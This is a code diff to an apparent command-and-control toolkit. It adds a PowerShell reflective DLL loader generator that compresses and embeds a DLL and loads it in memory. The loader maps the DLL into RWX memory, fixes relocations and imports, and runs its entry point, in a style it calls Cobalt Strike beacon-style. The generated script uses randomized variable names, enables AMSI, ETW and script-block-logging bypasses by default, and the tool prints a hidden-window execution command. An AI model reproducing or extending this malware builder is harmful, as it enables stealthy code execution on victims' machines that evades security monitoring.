@@ -24,6 +24,7 @@ Usage (from operator shell via generate command):
 
 import argparse
 import base64
+import gzip
 import hashlib
 import json
 import os
@@ -345,6 +346,164 @@ try{{${v['pipe']}.Close()}}catch{{}}
     return core
 
 
+# ─── Reflective PE loader ───
+
+def _pe_loader(v: dict, dll_b64_gz: str) -> str:
+    """Generate PowerShell reflective PE loader — embeds and runs a DLL in-memory."""
+    return f"""\
+# ── Reflective Loader ──
+${v['lcs']}=@'
+using System;using System.Runtime.InteropServices;
+public class {v['lt']}{{
+[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
+[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
+[DllImport("kernel32",EntryPoint="GetProcAddress")]public static extern IntPtr GetProcAddressOrd(IntPtr h,IntPtr n);
+}}
+public delegate bool {v['ld']}(IntPtr h,uint r,IntPtr p);
+'@
+${v['ltp']}=Add-Type -TypeDefinition ${v['lcs']} -PassThru
+${v['lm']}=[Runtime.InteropServices.Marshal]
+${v['lb6']}=@'
+{dll_b64_gz}
+'@
+${v['lgz']}=[Convert]::FromBase64String(${v['lb6']})
+${v['lms']}=[IO.MemoryStream]::new(${v['lgz']})
+${v['lgs']}=[IO.Compression.GZipStream]::new(${v['lms']},[IO.Compression.CompressionMode]::Decompress)
+${v['los']}=[IO.MemoryStream]::new()
+${v['lgs']}.CopyTo(${v['los']})
+${v['ldl']}=${v['los']}.ToArray()
+${v['lgs']}.Close();${v['lms']}.Close();${v['los']}.Close()
+
+# Parse PE
+${v['lef']}=[BitConverter]::ToInt32(${v['ldl']},0x3C)
+${v['lns']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lef']}+6)
+${v['lso']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lef']}+20)
+${v['lop']}=${v['lef']}+24
+${v['lmg']}=[BitConverter]::ToUInt16(${v['ldl']},${v['lop']})
+${v['l64']}=${v['lmg']}-eq 0x20b
+if(${v['l64']}){{
+${v['ler']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+16)
+${v['lib']}=[BitConverter]::ToInt64(${v['ldl']},${v['lop']}+24)
+${v['lsi']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+56)
+${v['lsh']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+60)
+${v['lir']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+120)
+${v['lis']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+124)
+${v['lrr']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+152)
+${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+156)
+}}else{{
+${v['ler']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+16)
+${v['lib']}=[int64][BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+28)
+${v['lsi']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+56)
+${v['lsh']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+60)
+${v['lir']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+104)
+${v['lis']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+108)
+${v['lrr']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+136)
+${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+140)
+}}
+
+# Allocate — try preferred base, fall back to any
+${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]${v['lib']},[UIntPtr]${v['lsi']},0x3000,0x40)
+if(${v['lnb']}-eq [IntPtr]::Zero){{
+${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]${v['lsi']},0x3000,0x40)
+}}
+if(${v['lnb']}-eq [IntPtr]::Zero){{return}}
+
+# Copy headers
+${v['lm']}::Copy(${v['ldl']},0,${v['lnb']},[int]${v['lsh']})
+
+# Copy sections
+${v['lsc']}=${v['lop']}+${v['lso']}
+for(${v['li']}=0;${v['li']}-lt ${v['lns']};${v['li']}++){{
+${v['lva']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+12)
+${v['lrd']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+16)
+${v['lrp']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lsc']}+20)
+if(${v['lrd']}-gt 0 -and ${v['lrp']}-gt 0){{
+${v['lds']}=[IntPtr]::Add(${v['lnb']},[int]${v['lva']})
+${v['lm']}::Copy(${v['ldl']},[int]${v['lrp']},${v['lds']},[int]${v['lrd']})
+}}
+${v['lsc']}+=40
+}}
+
+# Process relocations
+${v['ldt']}=${v['lnb']}.ToInt64()-${v['lib']}
+if(${v['ldt']}-ne 0 -and ${v['lrr']}-gt 0 -and ${v['lrs']}-gt 0){{
+${v['lpo']}=[IntPtr]::Add(${v['lnb']},[int]${v['lrr']})
+${v['len']}=${v['lpo']}.ToInt64()+${v['lrs']}
+while(${v['lpo']}.ToInt64()-lt ${v['len']}){{
+${v['lbv']}=${v['lm']}::ReadInt32(${v['lpo']})
+${v['lbz']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lpo']},4))
+if(${v['lbz']}-le 8){{break}}
+${v['lne']}=[int](([int]${v['lbz']}-8)/2)
+for(${v['lj']}=0;${v['lj']}-lt ${v['lne']};${v['lj']}++){{
+${v['lra']}=${v['lm']}::ReadInt16([IntPtr]::Add(${v['lpo']},8+${v['lj']}*2))-band 0xFFFF
+${v['let']}=(${v['lra']}-shr 12)-band 0xF
+${v['leo']}=${v['lra']}-band 0xFFF
+if(${v['let']}-eq 10){{
+${v['lad']}=[IntPtr]::Add(${v['lnb']},${v['lbv']}+${v['leo']})
+${v['lv']}=${v['lm']}::ReadInt64(${v['lad']})
+${v['lm']}::WriteInt64(${v['lad']},${v['lv']}+${v['ldt']})
+}}elseif(${v['let']}-eq 3){{
+${v['lad']}=[IntPtr]::Add(${v['lnb']},${v['lbv']}+${v['leo']})
+${v['lv']}=${v['lm']}::ReadInt32(${v['lad']})
+${v['lm']}::WriteInt32(${v['lad']},[int](${v['lv']}+${v['ldt']}))
+}}
+}}
+${v['lpo']}=[IntPtr]::Add(${v['lpo']},[int]${v['lbz']})
+}}
+}}
+
+# Resolve imports
+if(${v['lir']}-gt 0 -and ${v['lis']}-gt 0){{
+${v['lid']}=[IntPtr]::Add(${v['lnb']},[int]${v['lir']})
+while($true){{
+${v['lit']}=${v['lm']}::ReadInt32(${v['lid']})
+${v['lin']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},12))
+${v['lia']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},16))
+if(${v['lin']}-eq 0){{break}}
+if(${v['lit']}-eq 0){{${v['lit']}=${v['lia']}}}
+${v['lmh']}=${v['ltp']}[0]::LoadLibrary(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))
+${v['lpt']}=[IntPtr]::Add(${v['lnb']},[int]${v['lit']})
+${v['lad']}=[IntPtr]::Add(${v['lnb']},[int]${v['lia']})
+while($true){{
+if(${v['l64']}){{
+${v['lie']}=${v['lm']}::ReadInt64(${v['lpt']})
+if(${v['lie']}-eq 0){{break}}
+if(${v['lie']}-lt 0){{
+${v['lfa']}=${v['ltp']}[0]::GetProcAddressOrd(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
+}}else{{
+${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
+${v['lfa']}=${v['ltp']}[0]::GetProcAddress(${v['lmh']},${v['lfn']})
+}}
+${v['lm']}::WriteInt64(${v['lad']},${v['lfa']}.ToInt64())
+${v['lpt']}=[IntPtr]::Add(${v['lpt']},8)
+${v['lad']}=[IntPtr]::Add(${v['lad']},8)
+}}else{{
+${v['lie']}=${v['lm']}::ReadInt32(${v['lpt']})
+if(${v['lie']}-eq 0){{break}}
+if(${v['lie']}-lt 0){{
+${v['lfa']}=${v['ltp']}[0]::GetProcAddressOrd(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
+}}else{{
+${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
+${v['lfa']}=${v['ltp']}[0]::GetProcAddress(${v['lmh']},${v['lfn']})
+}}
+${v['lm']}::WriteInt32(${v['lad']},${v['lfa']}.ToInt32())
+${v['lpt']}=[IntPtr]::Add(${v['lpt']},4)
+${v['lad']}=[IntPtr]::Add(${v['lad']},4)
+}}
+}}
+${v['lid']}=[IntPtr]::Add(${v['lid']},20)
+}}
+}}
+
+# Execute entry point (DllMainCRTStartup → DllMain)
+${v['lep']}=[IntPtr]::Add(${v['lnb']},[int]${v['ler']})
+${v['ldm']}=${v['lm']}::GetDelegateForFunctionPointer(${v['lep']},${v['ltp']}[1])
+${v['ldm']}.Invoke(${v['lnb']},[uint32]1,[IntPtr]::Zero)
+while($true){{Start-Sleep 86400}}
+"""
+
+
 # ─── Main build function ───
 
 def build_powershell_agent(
@@ -443,11 +602,102 @@ def build_powershell_agent(
     return output_path, psk
 
 
+# ─── Reflective DLL loader build ───
+
+def build_powershell_loader(
+    dll_path: Path,
+    no_amsi: bool = False,
+    no_etw: bool = False,
+    no_sbl: bool = False,
+    debug: bool = False,
+    output_path: Path = None,
+) -> Path:
+    """
+    Generate a PowerShell reflective DLL loader.
+
+    Embeds a pre-compiled DLL (gzip-compressed, base64-encoded) into a .ps1
+    that reflectively loads it in-memory — Cobalt Strike beacon-style.
+
+    The DLL must have its own comms built in (e.g. HTTPS agent DLL).
+    Returns the output .ps1 path.
+    """
+    dll_bytes = Path(dll_path).read_bytes()
+
+    # Compress + encode
+    gz = gzip.compress(dll_bytes, compresslevel=9)
+    b64 = base64.b64encode(gz).decode()
+    # Split into 76-char lines for readability in the PS here-string
+    b64_lines = '\n'.join(b64[i:i+76] for i in range(0, len(b64), 76))
+
+    # Generate randomized variable names
+    v = {}
+    needed_vars = [
+        # AMSI bypass
+        'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
+        # ETW bypass
+        'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
+        # SBL bypass
+        's1', 's2', 's3', 's4', 's5',
+        # PE loader
+        'lcs', 'ltp', 'lm',
+        'lb6', 'lgz', 'lms', 'lgs', 'los', 'ldl',
+        'lef', 'lns', 'lso', 'lop', 'lmg', 'l64',
+        'ler', 'lib', 'lsi', 'lsh',
+        'lir', 'lis', 'lrr', 'lrs',
+        'lnb',
+        'lsc', 'li', 'lva', 'lrd', 'lrp', 'lds',
+        'ldt', 'lpo', 'len', 'lbv', 'lbz', 'lne',
+        'lj', 'lra', 'let', 'leo', 'lad', 'lv',
+        'lid', 'lin', 'lmh', 'lit', 'lia',
+        'lie', 'lfn', 'lfa', 'lpt',
+        'lep', 'ldm',
+    ]
+    used = set()
+    for var in needed_vars:
+        name = _rand_name(random.randint(6, 10))
+        while name in used:
+            name = _rand_name(random.randint(6, 10))
+        v[var] = name
+        used.add(name)
+
+    # C# class and delegate type names (randomized)
+    v['lt'] = _rand_name(10)
+    v['ld'] = _rand_name(10)
+
+    # Assemble script
+    parts = []
+
+    if debug:
+        parts.append("$ErrorActionPreference='Continue'\n")
+    else:
+        parts.append("$ErrorActionPreference='SilentlyContinue'\n")
+
+    if not no_amsi:
+        parts.append(_amsi_bypass(v))
+    if not no_etw:
+        parts.append(_etw_bypass(v))
+    if not no_sbl:
+        parts.append(_sbl_bypass(v))
+
+    parts.append(_pe_loader(v, b64_lines))
+
+    script = '\n'.join(parts)
+
+    # Write output
+    if output_path is None:
+        output_path = Path('builds') / f'{Path(dll_path).stem}_loader.ps1'
+    output_path = Path(output_path)
+    output_path.parent.mkdir(parents=True, exist_ok=True)
+    output_path.write_text(script, encoding='utf-8')
+
+    return output_path
+
+
 # ─── Standalone CLI ───
 
 def parse_args():
-    p = argparse.ArgumentParser(description='Generate PowerShell agent')
-    p.add_argument('--pipe-host', required=True, help='C2 host (SMB or TCP)')
+    p = argparse.ArgumentParser(description='Generate PowerShell agent or reflective DLL loader')
+    p.add_argument('--pipe-host', default='', help='C2 host (SMB or TCP)')
     p.add_argument('--pipe-name', default='TSVCPIPE-default', help='Named pipe name (pipe transport)')
     p.add_argument('--transport', choices=['pipe', 'tcp'], default='pipe',
                    help='Transport: pipe (SMB named pipe) or tcp (raw TCP)')
@@ -456,7 +706,8 @@ def parse_args():
     p.add_argument('--sleep', type=int, default=60, help='Beacon interval (s)')
     p.add_argument('--jitter', type=int, default=25, help='Jitter %%')
     p.add_argument('--kill-date', default='', help='YYYY-MM-DD kill date')
-    p.add_argument('--output', '-o', default='builds/agent.ps1')
+    p.add_argument('--output', '-o', default=None)
+    p.add_argument('--embed-dll', default=None, help='Path to DLL to embed (reflective loader mode)')
     p.add_argument('--no-amsi', action='store_true')
     p.add_argument('--no-etw', action='store_true')
     p.add_argument('--no-sbl', action='store_true')
@@ -466,9 +717,36 @@ def parse_args():
 
 def main():
     args = parse_args()
+
+    # ── Reflective DLL loader mode ──
+    if args.embed_dll:
+        dll_path = Path(args.embed_dll)
+        if not dll_path.exists():
+            print(f"[!] DLL not found: {dll_path}")
+            sys.exit(1)
+        output = Path(args.output) if args.output else None
+        out = build_powershell_loader(
+            dll_path=dll_path,
+            no_amsi=args.no_amsi,
+            no_etw=args.no_etw,
+            no_sbl=args.no_sbl,
+            debug=args.debug,
+            output_path=output,
+        )
+        size_kb = out.stat().st_size / 1024
+        print(f"[+] Reflective loader: {out} ({size_kb:.1f} KB)")
+        print(f"[+] Embedded DLL:      {dll_path.name} ({dll_path.stat().st_size / 1024:.1f} KB)")
+        print(f"[+] Execute: powershell -ep bypass -w hidden -f {out.name}")
+        return
+
+    # ── Standard agent mode ──
+    if not args.pipe_host:
+        print("[!] --pipe-host is required for agent mode (or use --embed-dll for loader mode)")
+        sys.exit(1)
     if args.transport == "tcp" and not args.tcp_port:
         print("[!] --tcp-port is required when --transport tcp")
         sys.exit(1)
+    output = Path(args.output) if args.output else Path('builds/agent.ps1')
     out, psk = build_powershell_agent(
         pipe_host=args.pipe_host,
         pipe_name=args.pipe_name,
@@ -479,7 +757,7 @@ def main():
         no_etw=args.no_etw,
         no_sbl=args.no_sbl,
         debug=args.debug,
-        output_path=Path(args.output),
+        output_path=output,
         transport=args.transport,
         tcp_port=args.tcp_port,
     )
